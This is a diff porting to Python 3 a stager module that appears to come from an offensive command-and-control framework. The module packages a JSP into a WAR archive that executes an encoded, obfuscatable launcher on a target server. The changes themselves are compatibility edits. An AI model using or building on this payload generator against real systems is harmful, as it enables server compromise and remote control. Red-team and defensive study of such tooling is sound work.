@@ -1,8 +1,13 @@
+from __future__ import print_function
+from future import standard_library
+standard_library.install_aliases()
+from builtins import str
+from builtins import object
 from lib.common import helpers
 import zipfile
-import StringIO
+import io
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -55,7 +60,7 @@ class Stager:
             'ObfuscateCommand' : {
                 'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                 'Required'      :   False,
-                'Value'         :   r'Token\All\1,Launcher\STDIN++\1234567'
+                'Value'         :   r'Token\All\1'
             },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
@@ -110,7 +115,7 @@ class Stager:
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscate, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 
         if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+            print(helpers.color("[!] Error in launcher command generation."))
             return ""
 
         else:
@@ -138,7 +143,7 @@ Process p=Runtime.getRuntime().exec("'''+str(launcher)+'''");
 ''' %(appName, appName)
 
             # build the in-memory ZIP and write the three files in
-            warFile = StringIO.StringIO() 
+            warFile = io.StringIO() 
             zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)
 
             zipData.writestr("META-INF/MANIFEST.MF", manifest)
